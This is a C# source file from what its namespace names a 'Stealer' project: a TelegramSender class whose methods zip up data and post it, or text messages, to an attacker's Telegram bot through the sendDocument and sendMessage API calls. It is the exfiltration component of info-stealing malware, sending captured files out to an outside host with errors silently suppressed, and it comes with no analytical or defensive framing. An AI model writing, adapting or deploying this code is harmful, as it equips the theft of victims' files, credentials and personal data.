using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Stealer.Utils
{
    public static class TelegramSender
    {
        public static async Task<bool> SendZipAsync(byte[] zipData, string fileName)
        {
            Config.Initialize();

            if (zipData == null || zipData.Length == 0)
                return false;

            if (string.IsNullOrEmpty(Config.BotToken) || string.IsNullOrEmpty(Config.ChatId))
                return false;

            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromMinutes(5);

                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent(Config.ChatId), "chat_id");

                    var fileContent = new ByteArrayContent(zipData);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                    content.Add(fileContent, "document", fileName);

                    string url = $"https://api.telegram.org/bot{Config.BotToken}/sendDocument";
                    var response = await client.PostAsync(url, content);

                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        public static async Task<bool> SendMessageAsync(string message)
        {
            Config.Initialize();

            if (string.IsNullOrEmpty(Config.BotToken) || string.IsNullOrEmpty(Config.ChatId))
                return false;

            try
            {
                using (var client = new HttpClient())
                {
                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent(Config.ChatId), "chat_id");
                    content.Add(new StringContent(message), "text");

                    string url = $"https://api.telegram.org/bot{Config.BotToken}/sendMessage";
                    var response = await client.PostAsync(url, content);

                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
